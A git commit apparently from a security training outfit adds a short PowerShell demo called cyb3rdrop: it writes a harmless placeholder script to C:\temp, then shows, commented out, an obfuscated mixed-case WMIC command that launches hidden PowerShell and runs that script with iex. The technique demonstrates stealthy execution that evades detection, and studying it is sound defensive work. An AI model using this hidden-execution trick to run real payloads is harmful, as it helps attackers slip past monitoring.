4daedbbe53da8cae99b5eee9ae5e92d6afae1309
n0isegat3 <jan@cyber-rangers.com>
2021-04-29 16:40:34 +0200

    cyb3rdrop demo

---
+++ cyb3rdrop-demo.ps1
@@ -0,0 +1,8 @@
+﻿#preparation
+'"malicious action completed" | out-file C:\temp\cyb3rdrop-hack-suceeded.txt' | Out-File C:\temp\cyb3rdrop.ps1 -Force
+
+
+#hack (run in cmd.exe)
+<#
+C:\wiNDowS\sySTem32\WbEm\WMic.Exe 'prOCESs'   "caLl"    cReATE  "POwERsHeLl -WiNDows HidDEN   iex C:\temp\cyb3rdrop.ps1"
+#>
